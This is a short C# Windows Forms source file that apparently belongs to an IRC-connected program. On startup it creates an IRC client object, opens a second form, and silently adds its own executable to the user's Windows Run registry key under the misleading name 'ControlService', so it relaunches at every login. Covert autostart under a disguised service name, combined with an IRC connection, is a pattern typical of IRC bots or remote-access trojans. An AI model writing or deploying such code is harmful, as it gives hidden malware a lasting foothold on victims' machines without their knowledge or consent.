using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ChatSharp;
using Microsoft.Win32;

namespace tom
{
    public partial class Form1 : Form
    {
        

        public Form1()
        {
            InitializeComponent();
            IRC irc = new IRC();
            Form2 form = new Form2();
            form.Show();

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("ControlService", Application.ExecutablePath.ToString());   
        }
    }
}
